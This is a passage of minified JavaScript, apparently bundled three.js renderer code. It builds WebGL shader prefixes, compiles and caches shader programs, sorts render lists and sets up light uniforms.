SPECULARMAP_UV "+n.specularMapUv:"",n.specularColorMapUv?"#define SPECULAR_COLORMAP_UV "+n.specularColorMapUv:"",n.specularIntensityMapUv?"#define SPECULAR_INTENSITYMAP_UV "+n.specularIntensityMapUv:"",n.transmissionMapUv?"#define TRANSMISSIONMAP_UV "+n.transmissionMapUv:"",n.thicknessMapUv?"#define THICKNESSMAP_UV "+n.thicknessMapUv:"",n.vertexTangents&&n.flatShading===!1?"#define USE_TANGENT":"",n.vertexColors?"#define USE_COLOR":"",n.vertexAlphas?"#define USE_COLOR_ALPHA":"",n.vertexUv1s?"#define USE_UV1":"",n.vertexUv2s?"#define USE_UV2":"",n.vertexUv3s?"#define USE_UV3":"",n.pointsUvs?"#define USE_POINTS_UV":"",n.flatShading?"#define FLAT_SHADED":"",n.skinning?"#define USE_SKINNING":"",n.morphTargets?"#define USE_MORPHTARGETS":"",n.morphNormals&&n.flatShading===!1?"#define USE_MORPHNORMALS":"",n.morphColors?"#define USE_MORPHCOLORS":"",n.morphTargetsCount>0?"#define MORPHTARGETS_TEXTURE_STRIDE "+n.morphTextureStride:"",n.morphTargetsCount>0?"#define MORPHTARGETS_COUNT "+n.morphTargetsCount:"",n.doubleSided?"#define DOUBLE_SIDED":"",n.flipSided?"#define FLIP_SIDED":"",n.shadowMapEnabled?"#define USE_SHADOWMAP":"",n.shadowMapEnabled?"#define "+l:"",n.sizeAttenuation?"#define USE_SIZEATTENUATION":"",n.numLightProbes>0?"#define USE_LIGHT_PROBES":"",n.logarithmicDepthBuffer?"#define USE_LOGARITHMIC_DEPTH_BUFFER":"",n.reversedDepthBuffer?"#define USE_REVERSED_DEPTH_BUFFER":"","uniform mat4 modelMatrix;","uniform mat4 modelViewMatrix;","uniform mat4 projectionMatrix;","uniform mat4 viewMatrix;","uniform mat3 normalMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;","#ifdef USE_INSTANCING","	attribute mat4 instanceMatrix;","#endif","#ifdef USE_INSTANCING_COLOR","	attribute vec3 instanceColor;","#endif","#ifdef USE_INSTANCING_MORPH","	uniform sampler2D morphTexture;","#endif","attribute vec3 position;","attribute vec3 normal;","attribute vec2 uv;","#ifdef USE_UV1","	attribute vec2 uv1;","#endif","#ifdef USE_UV2","	attribute vec2 uv2;","#endif","#ifdef USE_UV3","	attribute vec2 uv3;","#endif","#ifdef USE_TANGENT","	attribute vec4 tangent;","#endif","#if defined( USE_COLOR_ALPHA )","	attribute vec4 color;","#elif defined( USE_COLOR )","	attribute vec3 color;","#endif","#ifdef USE_SKINNING","	attribute vec4 skinIndex;","	attribute vec4 skinWeight;","#endif",`
`].filter(ma).join(`
`),u=[tg(n),"#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,y,n.useFog&&n.fog?"#define USE_FOG":"",n.useFog&&n.fogExp2?"#define FOG_EXP2":"",n.alphaToCoverage?"#define ALPHA_TO_COVERAGE":"",n.map?"#define USE_MAP":"",n.matcap?"#define USE_MATCAP":"",n.envMap?"#define USE_ENVMAP":"",n.envMap?"#define "+c:"",n.envMap?"#define "+h:"",n.envMap?"#define "+d:"",p?"#define CUBEUV_TEXEL_WIDTH "+p.texelWidth:"",p?"#define CUBEUV_TEXEL_HEIGHT "+p.texelHeight:"",p?"#define CUBEUV_MAX_MIP "+p.maxMip+".0":"",n.lightMap?"#define USE_LIGHTMAP":"",n.aoMap?"#define USE_AOMAP":"",n.bumpMap?"#define USE_BUMPMAP":"",n.normalMap?"#define USE_NORMALMAP":"",n.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",n.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",n.emissiveMap?"#define USE_EMISSIVEMAP":"",n.anisotropy?"#define USE_ANISOTROPY":"",n.anisotropyMap?"#define USE_ANISOTROPYMAP":"",n.clearcoat?"#define USE_CLEARCOAT":"",n.clearcoatMap?"#define USE_CLEARCOATMAP":"",n.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",n.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",n.dispersion?"#define USE_DISPERSION":"",n.iridescence?"#define USE_IRIDESCENCE":"",n.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",n.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",n.specularMap?"#define USE_SPECULARMAP":"",n.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",n.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",n.roughnessMap?"#define USE_ROUGHNESSMAP":"",n.metalnessMap?"#define USE_METALNESSMAP":"",n.alphaMap?"#define USE_ALPHAMAP":"",n.alphaTest?"#define USE_ALPHATEST":"",n.alphaHash?"#define USE_ALPHAHASH":"",n.sheen?"#define USE_SHEEN":"",n.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",n.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",n.transmission?"#define USE_TRANSMISSION":"",n.transmissionMap?"#define USE_TRANSMISSIONMAP":"",n.thicknessMap?"#define USE_THICKNESSMAP":"",n.vertexTangents&&n.flatShading===!1?"#define USE_TANGENT":"",n.vertexColors||n.instancingColor||n.batchingColor?"#define USE_COLOR":"",n.vertexAlphas?"#define USE_COLOR_ALPHA":"",n.vertexUv1s?"#define USE_UV1":"",n.vertexUv2s?"#define USE_UV2":"",n.vertexUv3s?"#define USE_UV3":"",n.pointsUvs?"#define USE_POINTS_UV":"",n.gradientMap?"#define USE_GRADIENTMAP":"",n.flatShading?"#define FLAT_SHADED":"",n.doubleSided?"#define DOUBLE_SIDED":"",n.flipSided?"#define FLIP_SIDED":"",n.shadowMapEnabled?"#define USE_SHADOWMAP":"",n.shadowMapEnabled?"#define "+l:"",n.premultipliedAlpha?"#define PREMULTIPLIED_ALPHA":"",n.numLightProbes>0?"#define USE_LIGHT_PROBES":"",n.decodeVideoTexture?"#define DECODE_VIDEO_TEXTURE":"",n.decodeVideoTextureEmissive?"#define DECODE_VIDEO_TEXTURE_EMISSIVE":"",n.logarithmicDepthBuffer?"#define USE_LOGARITHMIC_DEPTH_BUFFER":"",n.reversedDepthBuffer?"#define USE_REVERSED_DEPTH_BUFFER":"","uniform mat4 viewMatrix;","uniform vec3 cameraPosition;","uniform bool isOrthographic;",n.toneMapping!==li?"#define TONE_MAPPING":"",n.toneMapping!==li?Oe.tonemapping_pars_fragment:"",n.toneMapping!==li?CA("toneMapping",n.toneMapping):"",n.dithering?"#define DITHERING":"",n.opaque?"#define OPAQUE":"",Oe.colorspace_pars_fragment,TA("linearToOutputTexel",n.outputColorSpace),RA(),n.useDepthPacking?"#define DEPTH_PACKING "+n.depthPacking:"",`
`].filter(ma).join(`
`)),a=fh(a),a=Jm(a,n),a=Qm(a,n),o=fh(o),o=Jm(o,n),o=Qm(o,n),a=eg(a),o=eg(o),n.isRawShaderMaterial!==!0&&(v=`#version 300 es
`,g=[f,"#define attribute in","#define varying out","#define texture2D texture"].join(`
`)+`
`+g,u=["#define varying in",n.glslVersion===mm?"":"layout(location = 0) out highp vec4 pc_fragColor;",n.glslVersion===mm?"":"#define gl_FragColor pc_fragColor","#define gl_FragDepthEXT gl_FragDepth","#define texture2D texture","#define textureCube texture","#define texture2DProj textureProj","#define texture2DLodEXT textureLod","#define texture2DProjLodEXT textureProjLod","#define textureCubeLodEXT textureLod","#define texture2DGradEXT textureGrad","#define texture2DProjGradEXT textureProjGrad","#define textureCubeGradEXT textureGrad"].join(`
`)+`
`+u);const x=v+g+a,S=v+u+o,E=$m(s,s.VERTEX_SHADER,x),A=$m(s,s.FRAGMENT_SHADER,S);s.attachShader(_,E),s.attachShader(_,A),n.index0AttributeName!==void 0?s.bindAttribLocation(_,0,n.index0AttributeName):n.morphTargets===!0&&s.bindAttribLocation(_,0,"position"),s.linkProgram(_);function C(k){if(t.debug.checkShaderErrors){const H=s.getProgramInfoLog(_)||"",V=s.getShaderInfoLog(E)||"",W=s.getShaderInfoLog(A)||"",j=H.trim(),X=V.trim(),D=W.trim();let N=!0,O=!0;if(s.getProgramParameter(_,s.LINK_STATUS)===!1)if(N=!1,typeof t.debug.onShaderError=="function")t.debug.onShaderError(s,_,E,A);else{const B=Zm(s,E,"vertex"),J=Zm(s,A,"fragment");Ze("THREE.WebGLProgram: Shader Error "+s.getError()+" - VALIDATE_STATUS "+s.getProgramParameter(_,s.VALIDATE_STATUS)+`

Material Name: `+k.name+`
Material Type: `+k.type+`

Program Info Log: `+j+`
`+B+`
`+J)}else j!==""?Ie("WebGLProgram: Program Info Log:",j):(X===""||D==="")&&(O=!1);O&&(k.diagnostics={runnable:N,programLog:j,vertexShader:{log:X,prefix:g},fragmentShader:{log:D,prefix:u}})}s.deleteShader(E),s.deleteShader(A),L=new pl(s,_),w=PA(s,_)}let L;this.getUniforms=function(){return L===void 0&&C(this),L};let w;this.getAttributes=function(){return w===void 0&&C(this),w};let M=n.rendererExtensionParallelShaderCompile===!1;return this.isReady=function(){return M===!1&&(M=s.getProgramParameter(_,SA)),M},this.destroy=function(){i.releaseStatesOfProgram(this),s.deleteProgram(_),this.program=void 0},this.type=n.shaderType,this.name=n.shaderName,this.id=wA++,this.cacheKey=e,this.usedTimes=1,this.program=_,this.vertexShader=E,this.fragmentShader=A,this}let YA=0;class $A{constructor(){this.shaderCache=new Map,this.materialCache=new Map}update(e){const n=e.vertexShader,i=e.fragmentShader,s=this._getShaderStage(n),r=this._getShaderStage(i),a=this._getShaderCacheForMaterial(e);return a.has(s)===!1&&(a.add(s),s.usedTimes++),a.has(r)===!1&&(a.add(r),r.usedTimes++),this}remove(e){const n=this.materialCache.get(e);for(const i of n)i.usedTimes--,i.usedTimes===0&&this.shaderCache.delete(i.code);return this.materialCache.delete(e),this}getVertexShaderID(e){return this._getShaderStage(e.vertexShader).id}getFragmentShaderID(e){return this._getShaderStage(e.fragmentShader).id}dispose(){this.shaderCache.clear(),this.materialCache.clear()}_getShaderCacheForMaterial(e){const n=this.materialCache;let i=n.get(e);return i===void 0&&(i=new Set,n.set(e,i)),i}_getShaderStage(e){const n=this.shaderCache;let i=n.get(e);return i===void 0&&(i=new KA(e),n.set(e,i)),i}}class KA{constructor(e){this.id=YA++,this.code=e,this.usedTimes=0}}function ZA(t,e,n,i,s,r,a){const o=new ry,l=new $A,c=new Set,h=[],d=new Map,p=s.logarithmicDepthBuffer;let f=s.precision;const y={MeshDepthMaterial:"depth",MeshDistanceMaterial:"distance",MeshNormalMaterial:"normal",MeshBasicMaterial:"basic",MeshLambertMaterial:"lambert",MeshPhongMaterial:"phong",MeshToonMaterial:"toon",MeshStandardMaterial:"physical",MeshPhysicalMaterial:"physical",MeshMatcapMaterial:"matcap",LineBasicMaterial:"basic",LineDashedMaterial:"dashed",PointsMaterial:"points",ShadowMaterial:"shadow",SpriteMaterial:"sprite"};function _(w){return c.add(w),w===0?"uv":`uv${w}`}function g(w,M,k,H,V){const W=H.fog,j=V.geometry,X=w.isMeshStandardMaterial?H.environment:null,D=(w.isMeshStandardMaterial?n:e).get(w.envMap||X),N=D&&D.mapping===ac?D.image.height:null,O=y[w.type];w.precision!==null&&(f=s.getMaxPrecision(w.precision),f!==w.precision&&Ie("WebGLProgram.getParameters:",w.precision,"not supported, using",f,"instead."));const B=j.morphAttributes.position||j.morphAttributes.normal||j.morphAttributes.color,J=B!==void 0?B.length:0;let oe=0;j.morphAttributes.position!==void 0&&(oe=1),j.morphAttributes.normal!==void 0&&(oe=2),j.morphAttributes.color!==void 0&&(oe=3);let ge,ze,Ye,Z;if(O){const tt=ni[O];ge=tt.vertexShader,ze=tt.fragmentShader}else ge=w.vertexShader,ze=w.fragmentShader,l.update(w),Ye=l.getVertexShaderID(w),Z=l.getFragmentShaderID(w);const ne=t.getRenderTarget(),_e=t.state.buffers.depth.getReversed(),De=V.isInstancedMesh===!0,we=V.isBatchedMesh===!0,$e=!!w.map,Nt=!!w.matcap,We=!!D,et=!!w.aoMap,at=!!w.lightMap,Fe=!!w.bumpMap,Mt=!!w.normalMap,P=!!w.displacementMap,Et=!!w.emissiveMap,Qe=!!w.metalnessMap,lt=!!w.roughnessMap,Ee=w.anisotropy>0,R=w.clearcoat>0,b=w.dispersion>0,U=w.iridescence>0,Q=w.sheen>0,te=w.transmission>0,K=Ee&&!!w.anisotropyMap,Ae=R&&!!w.clearcoatMap,ce=R&&!!w.clearcoatNormalMap,Me=R&&!!w.clearcoatRoughnessMap,Pe=U&&!!w.iridescenceMap,re=U&&!!w.iridescenceThicknessMap,de=Q&&!!w.sheenColorMap,Se=Q&&!!w.sheenRoughnessMap,Te=!!w.specularMap,ue=!!w.specularColorMap,Be=!!w.specularIntensityMap,I=te&&!!w.transmissionMap,me=te&&!!w.thicknessMap,ae=!!w.gradientMap,ve=!!w.alphaMap,ie=w.alphaTest>0,ee=!!w.alphaHash,le=!!w.extensions;let Ne=li;w.toneMapped&&(ne===null||ne.isXRRenderTarget===!0)&&(Ne=t.toneMapping);const ct={shaderID:O,shaderType:w.type,shaderName:w.name,vertexShader:ge,fragmentShader:ze,defines:w.defines,customVertexShaderID:Ye,customFragmentShaderID:Z,isRawShaderMaterial:w.isRawShaderMaterial===!0,glslVersion:w.glslVersion,precision:f,batching:we,batchingColor:we&&V._colorsTexture!==null,instancing:De,instancingColor:De&&V.instanceColor!==null,instancingMorph:De&&V.morphTexture!==null,outputColorSpace:ne===null?t.outputColorSpace:ne.isXRRenderTarget===!0?ne.texture.colorSpace:Fr,alphaToCoverage:!!w.alphaToCoverage,map:$e,matcap:Nt,envMap:We,envMapMode:We&&D.mapping,envMapCubeUVHeight:N,aoMap:et,lightMap:at,bumpMap:Fe,normalMap:Mt,displacementMap:P,emissiveMap:Et,normalMapObjectSpace:Mt&&w.normalMapType===Pw,normalMapTangentSpace:Mt&&w.normalMapType===ny,metalnessMap:Qe,roughnessMap:lt,anisotropy:Ee,anisotropyMap:K,clearcoat:R,clearcoatMap:Ae,clearcoatNormalMap:ce,clearcoatRoughnessMap:Me,dispersion:b,iridescence:U,iridescenceMap:Pe,iridescenceThicknessMap:re,sheen:Q,sheenColorMap:de,sheenRoughnessMap:Se,specularMap:Te,specularColorMap:ue,specularIntensityMap:Be,transmission:te,transmissionMap:I,thicknessMap:me,gradientMap:ae,opaque:w.transparent===!1&&w.blending===Tr&&w.alphaToCoverage===!1,alphaMap:ve,alphaTest:ie,alphaHash:ee,combine:w.combine,mapUv:$e&&_(w.map.channel),aoMapUv:et&&_(w.aoMap.channel),lightMapUv:at&&_(w.lightMap.channel),bumpMapUv:Fe&&_(w.bumpMap.channel),normalMapUv:Mt&&_(w.normalMap.channel),displacementMapUv:P&&_(w.displacementMap.channel),emissiveMapUv:Et&&_(w.emissiveMap.channel),metalnessMapUv:Qe&&_(w.metalnessMap.channel),roughnessMapUv:lt&&_(w.roughnessMap.channel),anisotropyMapUv:K&&_(w.anisotropyMap.channel),clearcoatMapUv:Ae&&_(w.clearcoatMap.channel),clearcoatNormalMapUv:ce&&_(w.clearcoatNormalMap.channel),clearcoatRoughnessMapUv:Me&&_(w.clearcoatRoughnessMap.channel),iridescenceMapUv:Pe&&_(w.iridescenceMap.channel),iridescenceThicknessMapUv:re&&_(w.iridescenceThicknessMap.channel),sheenColorMapUv:de&&_(w.sheenColorMap.channel),sheenRoughnessMapUv:Se&&_(w.sheenRoughnessMap.channel),specularMapUv:Te&&_(w.specularMap.channel),specularColorMapUv:ue&&_(w.specularColorMap.channel),specularIntensityMapUv:Be&&_(w.specularIntensityMap.channel),transmissionMapUv:I&&_(w.transmissionMap.channel),thicknessMapUv:me&&_(w.thicknessMap.channel),alphaMapUv:ve&&_(w.alphaMap.channel),vertexTangents:!!j.attributes.tangent&&(Mt||Ee),vertexColors:w.vertexColors,vertexAlphas:w.vertexColors===!0&&!!j.attributes.color&&j.attributes.color.itemSize===4,pointsUvs:V.isPoints===!0&&!!j.attributes.uv&&($e||ve),fog:!!W,useFog:w.fog===!0,fogExp2:!!W&&W.isFogExp2,flatShading:w.flatShading===!0&&w.wireframe===!1,sizeAttenuation:w.sizeAttenuation===!0,logarithmicDepthBuffer:p,reversedDepthBuffer:_e,skinning:V.isSkinnedMesh===!0,morphTargets:j.morphAttributes.position!==void 0,morphNormals:j.morphAttributes.normal!==void 0,morphColors:j.morphAttributes.color!==void 0,morphTargetsCount:J,morphTextureStride:oe,numDirLights:M.directional.length,numPointLights:M.point.length,numSpotLights:M.spot.length,numSpotLightMaps:M.spotLightMap.length,numRectAreaLights:M.rectArea.length,numHemiLights:M.hemi.length,numDirLightShadows:M.directionalShadowMap.length,numPointLightShadows:M.pointShadowMap.length,numSpotLightShadows:M.spotShadowMap.length,numSpotLightShadowsWithMaps:M.numSpotLightShadowsWithMaps,numLightProbes:M.numLightProbes,numClippingPlanes:a.numPlanes,numClipIntersection:a.numIntersection,dithering:w.dithering,shadowMapEnabled:t.shadowMap.enabled&&k.length>0,shadowMapType:t.shadowMap.type,toneMapping:Ne,decodeVideoTexture:$e&&w.map.isVideoTexture===!0&&je.getTransfer(w.map.colorSpace)===it,decodeVideoTextureEmissive:Et&&w.emissiveMap.isVideoTexture===!0&&je.getTransfer(w.emissiveMap.colorSpace)===it,premultipliedAlpha:w.premultipliedAlpha,doubleSided:w.side===wi,flipSided:w.side===pn,useDepthPacking:w.depthPacking>=0,depthPacking:w.depthPacking||0,index0AttributeName:w.index0AttributeName,extensionClipCullDistance:le&&w.extensions.clipCullDistance===!0&&i.has("WEBGL_clip_cull_distance"),extensionMultiDraw:(le&&w.extensions.multiDraw===!0||we)&&i.has("WEBGL_multi_draw"),rendererExtensionParallelShaderCompile:i.has("KHR_parallel_shader_compile"),customProgramCacheKey:w.customProgramCacheKey()};return ct.vertexUv1s=c.has(1),ct.vertexUv2s=c.has(2),ct.vertexUv3s=c.has(3),c.clear(),ct}function u(w){const M=[];if(w.shaderID?M.push(w.shaderID):(M.push(w.customVertexShaderID),M.push(w.customFragmentShaderID)),w.defines!==void 0)for(const k in w.defines)M.push(k),M.push(w.defines[k]);return w.isRawShaderMaterial===!1&&(v(M,w),x(M,w),M.push(t.outputColorSpace)),M.push(w.customProgramCacheKey),M.join()}function v(w,M){w.push(M.precision),w.push(M.outputColorSpace),w.push(M.envMapMode),w.push(M.envMapCubeUVHeight),w.push(M.mapUv),w.push(M.alphaMapUv),w.push(M.lightMapUv),w.push(M.aoMapUv),w.push(M.bumpMapUv),w.push(M.normalMapUv),w.push(M.displacementMapUv),w.push(M.emissiveMapUv),w.push(M.metalnessMapUv),w.push(M.roughnessMapUv),w.push(M.anisotropyMapUv),w.push(M.clearcoatMapUv),w.push(M.clearcoatNormalMapUv),w.push(M.clearcoatRoughnessMapUv),w.push(M.iridescenceMapUv),w.push(M.iridescenceThicknessMapUv),w.push(M.sheenColorMapUv),w.push(M.sheenRoughnessMapUv),w.push(M.specularMapUv),w.push(M.specularColorMapUv),w.push(M.specularIntensityMapUv),w.push(M.transmissionMapUv),w.push(M.thicknessMapUv),w.push(M.combine),w.push(M.fogExp2),w.push(M.sizeAttenuation),w.push(M.morphTargetsCount),w.push(M.morphAttributeCount),w.push(M.numDirLights),w.push(M.numPointLights),w.push(M.numSpotLights),w.push(M.numSpotLightMaps),w.push(M.numHemiLights),w.push(M.numRectAreaLights),w.push(M.numDirLightShadows),w.push(M.numPointLightShadows),w.push(M.numSpotLightShadows),w.push(M.numSpotLightShadowsWithMaps),w.push(M.numLightProbes),w.push(M.shadowMapType),w.push(M.toneMapping),w.push(M.numClippingPlanes),w.push(M.numClipIntersection),w.push(M.depthPacking)}function x(w,M){o.disableAll(),M.instancing&&o.enable(0),M.instancingColor&&o.enable(1),M.instancingMorph&&o.enable(2),M.matcap&&o.enable(3),M.envMap&&o.enable(4),M.normalMapObjectSpace&&o.enable(5),M.normalMapTangentSpace&&o.enable(6),M.clearcoat&&o.enable(7),M.iridescence&&o.enable(8),M.alphaTest&&o.enable(9),M.vertexColors&&o.enable(10),M.vertexAlphas&&o.enable(11),M.vertexUv1s&&o.enable(12),M.vertexUv2s&&o.enable(13),M.vertexUv3s&&o.enable(14),M.vertexTangents&&o.enable(15),M.anisotropy&&o.enable(16),M.alphaHash&&o.enable(17),M.batching&&o.enable(18),M.dispersion&&o.enable(19),M.batchingColor&&o.enable(20),M.gradientMap&&o.enable(21),w.push(o.mask),o.disableAll(),M.fog&&o.enable(0),M.useFog&&o.enable(1),M.flatShading&&o.enable(2),M.logarithmicDepthBuffer&&o.enable(3),M.reversedDepthBuffer&&o.enable(4),M.skinning&&o.enable(5),M.morphTargets&&o.enable(6),M.morphNormals&&o.enable(7),M.morphColors&&o.enable(8),M.premultipliedAlpha&&o.enable(9),M.shadowMapEnabled&&o.enable(10),M.doubleSided&&o.enable(11),M.flipSided&&o.enable(12),M.useDepthPacking&&o.enable(13),M.dithering&&o.enable(14),M.transmission&&o.enable(15),M.sheen&&o.enable(16),M.opaque&&o.enable(17),M.pointsUvs&&o.enable(18),M.decodeVideoTexture&&o.enable(19),M.decodeVideoTextureEmissive&&o.enable(20),M.alphaToCoverage&&o.enable(21),w.push(o.mask)}function S(w){const M=y[w.type];let k;if(M){const H=ni[M];k=oM.clone(H.uniforms)}else k=w.uniforms;return k}function E(w,M){let k=d.get(M);return k!==void 0?++k.usedTimes:(k=new qA(t,M,w,r),h.push(k),d.set(M,k)),k}function A(w){if(--w.usedTimes===0){const M=h.indexOf(w);h[M]=h[h.length-1],h.pop(),d.delete(w.cacheKey),w.destroy()}}function C(w){l.remove(w)}function L(){l.dispose()}return{getParameters:g,getProgramCacheKey:u,getUniforms:S,acquireProgram:E,releaseProgram:A,releaseShaderCache:C,programs:h,dispose:L}}function JA(){let t=new WeakMap;function e(a){return t.has(a)}function n(a){let o=t.get(a);return o===void 0&&(o={},t.set(a,o)),o}function i(a){t.delete(a)}function s(a,o,l){t.get(a)[o]=l}function r(){t=new WeakMap}return{has:e,get:n,remove:i,update:s,dispose:r}}function QA(t,e){return t.groupOrder!==e.groupOrder?t.groupOrder-e.groupOrder:t.renderOrder!==e.renderOrder?t.renderOrder-e.renderOrder:t.material.id!==e.material.id?t.material.id-e.material.id:t.z!==e.z?t.z-e.z:t.id-e.id}function ng(t,e){return t.groupOrder!==e.groupOrder?t.groupOrder-e.groupOrder:t.renderOrder!==e.renderOrder?t.renderOrder-e.renderOrder:t.z!==e.z?e.z-t.z:t.id-e.id}function ig(){const t=[];let e=0;const n=[],i=[],s=[];function r(){e=0,n.length=0,i.length=0,s.length=0}function a(d,p,f,y,_,g){let u=t[e];return u===void 0?(u={id:d.id,object:d,geometry:p,material:f,groupOrder:y,renderOrder:d.renderOrder,z:_,group:g},t[e]=u):(u.id=d.id,u.object=d,u.geometry=p,u.material=f,u.groupOrder=y,u.renderOrder=d.renderOrder,u.z=_,u.group=g),e++,u}function o(d,p,f,y,_,g){const u=a(d,p,f,y,_,g);f.transmission>0?i.push(u):f.transparent===!0?s.push(u):n.push(u)}function l(d,p,f,y,_,g){const u=a(d,p,f,y,_,g);f.transmission>0?i.unshift(u):f.transparent===!0?s.unshift(u):n.unshift(u)}function c(d,p){n.length>1&&n.sort(d||QA),i.length>1&&i.sort(p||ng),s.length>1&&s.sort(p||ng)}function h(){for(let d=e,p=t.length;d<p;d++){const f=t[d];if(f.id===null)break;f.id=null,f.object=null,f.geometry=null,f.material=null,f.group=null}}return{opaque:n,transmissive:i,transparent:s,init:r,push:o,unshift:l,finish:h,sort:c}}function eC(){let t=new WeakMap;function e(i,s){const r=t.get(i);let a;return r===void 0?(a=new ig,t.set(i,[a])):s>=r.length?(a=new ig,r.push(a)):a=r[s],a}function n(){t=new WeakMap}return{get:e,dispose:n}}function tC(){const t={};return{get:function(e){if(t[e.id]!==void 0)return t[e.id];let n;switch(e.type){case"DirectionalLight":n={direction:new G,color:new Xe};break;case"SpotLight":n={position:new G,direction:new G,color:new Xe,distance:0,coneCos:0,penumbraCos:0,decay:0};break;case"PointLight":n={position:new G,color:new Xe,distance:0,decay:0};break;case"HemisphereLight":n={direction:new G,skyColor:new Xe,groundColor:new Xe};break;case"RectAreaLight":n={color:new Xe,position:new G,halfWidth:new G,halfHeight:new G};break}return t[e.id]=n,n}}}function nC(){const t={};return{get:function(e){if(t[e.id]!==void 0)return t[e.id];let n;switch(e.type){case"DirectionalLight":n={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Je};break;case"SpotLight":n={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Je};break;case"PointLight":n={shadowIntensity:1,shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new Je,shadowCameraNear:1,shadowCameraFar:1e3};break}return t[e.id]=n,n}}}let iC=0;function sC(t,e){return(e.castShadow?2:0)-(t.castShadow?2:0)+(e.map?1:0)-(t.map?1:0)}function rC(t){const e=new tC,n=nC(),i={version:0,hash:{directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1,numSpotMaps:-1,numLightProbes:-1},ambient:[0,0,0],probe:[],directional:[],directionalShadow:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotLightMap:[],spotShadow:[],spotShadowMap:[],spotLightMatrix:[],rectArea:[],rectAreaLTC1:null,rectAreaLTC2:null,point:[],pointShadow:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],numSpotLightShadowsWithMaps:0,numLightProbes:0};for(let c=0;c<9;c++)i.probe.push(new G);const s=new G,r=new St,a=new St;function o(c){let h=0,d=0,p=0;for(let w=0;w<9;w++)i.probe[w].set(0,0,0);let f=0,y=0,_=0,g=0,u=0,v=0,x=0,S=0,E=0,A=0,C=0;c.sort(sC);for(let w=0,M=c.length;w<M;w++){const k=c[w],H=k.color,V=k.intensity,W=k.distance;let j=null;if(k.shadow&&k.shadow.map&&(k.shadow.map.texture.format===Or?j=k.shadow.map.texture:j=k.shadow.map.depthTexture||k.shadow.map.texture),k.isAmbientLight)h+=H.r*V,d+=H.g*V,p+=H.b*V;else if(k.isLightProbe){for(let X=0;X<9;X++)i.probe[X].addScaledVector(k.sh.coefficients[X],V);C++}else if(k.isDirectionalLight){const X=e.get(k);if(X.color.copy(k.color).multiplyScalar(k.intensity),k.castShadow){const D=k.shadow,N=n.get(k);N.shadowIntensity=D.intensity,N.shadowBias=D.bias,N.shadowNormalBias=D.normalBias,N.shadowRadius=D.radius,N.shadowMapSize=D.mapSize,i.directionalShadow[f]=N,i.directionalShadowMap[f]=j,i.directionalShadowMatrix[f]=k.shadow.matrix,v++}i.directional[f]=X,f++}else if(k.isSpotLight){const X=e.get(k);X.position.setFromMatrixPosition(k.matrixWorld),X.color.copy(H).multiplyScalar(V),X.distance=W,X.coneCos=Math.cos(k.angle),X.penumbraCos=Math.cos(k.angle*(1-k.penumbra)),X.decay=k.decay,i.spot[_]=X;const D=k.shadow;if(k.map&&(i.spotLightMap[E]=k.map,E++,D.updateMatrices(k),k.castShadow&&A++),i.spotLightMatrix[_]=D.matrix,k.castShadow){const N=n.get(k);N.shadowIntensity=D.intensity,N.shadowBias=D.bias,N.shadowNormalBias=D.normalBias,N.shadowRadius=D.radius,N.shadowMapSize=D.mapSize,i.spotShadow[_]=N,i.spotShadowMap[_]=j,S++}_++}else if(k.isRectAreaLight){const X=e.get(k);X.color.copy(H).multiplyScalar(V),X.halfWidth.set(k.width*.5,0,0),X.halfHeight.set(0,k.height*.5,0),i.rectArea[g]=X,g++}else if(k.isPointLight){const X=e.get(k);if(X.color.copy(k.color).multiplyScalar(k.intensity),X.distance=k.distance,X.decay=k.decay,k.castShadow){const D=k.shadow,N=n.get(k);N.shadowIntensity=D.intensity,N.shadowBias=D.bias,N.shadowNormalBias=D.normalBias,N.shadowRadius=D.radius,N.shadowMapSize=D.mapSize,N.shadowCameraNear=D.camera.near,N.shadowCameraFar=D.camera.far,i.pointShadow[y]=N,i.pointShadowMap[y]=j,i.pointShadowMatrix[y]=k.shadow.matrix,x++}i.point[y]=X,y++}else if(k.isHemisphereLight){const X=e.get(k);X.skyColor.copy(k.color).multiplyScalar(V),X.groundColor.copy(k.groundColor).multiplyScalar(V),i.hemi[u]=X,u++}}g>0&&(t.has("OES_texture_float_linear")===!0?(i.rectAreaLTC1=pe.LTC_FLOAT_1,i.rectAreaLTC2=pe.LTC_FLOAT_2):(i.rectAreaLTC1=pe.LTC_HALF_1,i.rectAreaLTC2=pe.LTC_HALF_2)),i.ambient[0]=h,i.ambient[1]=d,i.ambient[2]=p;const L=i.hash;(L.directionalLength!==f||L.pointLength!==y||L.spotLength!==_||L.rectAreaLength!==g||L.hemiLength!==u||L.numDirectionalShadows!==v||L.numPointShadows!==x||L.numSpotShadows!==S||L.numSpotMaps!==E||L.numLightProbes!==C)&&(i.directional.length=f,i.spot.length=_,i.rectArea.length=g,i.point.length=y,i.hemi.length=u,i.directionalShadow.length=v,i.directionalShadowMap.length=v,i.pointShadow.length=x,i.pointShadowMap.length=x,i.spotShadow.length=S,i.spotShadowMap.length=S,i.directionalShadowMatrix.length=v,i.pointShadowMatrix.length=x,i.spotLightMatrix.length=S+E-A,i.spotLightMap.length=E,i.numSpotLightShadowsWithMaps=A,i.numLightProbes=C,L.directionalLength=f,L.pointLength=y,L.spotLength=_,L.rectAreaLength=g,L.hemiLength=u,L.numDirectionalShadows=v,L.numPointShadows=x,L.numSpotShadows=S,L.numSpotMaps=E,L.numLightProbes=C,i.version=iC++)}function l(c,h){let d=0,p=0,f=0,y=0,_=0;const g=h.matrixWorldInverse;for(let u=0,v=c.length;u<v;u++){const 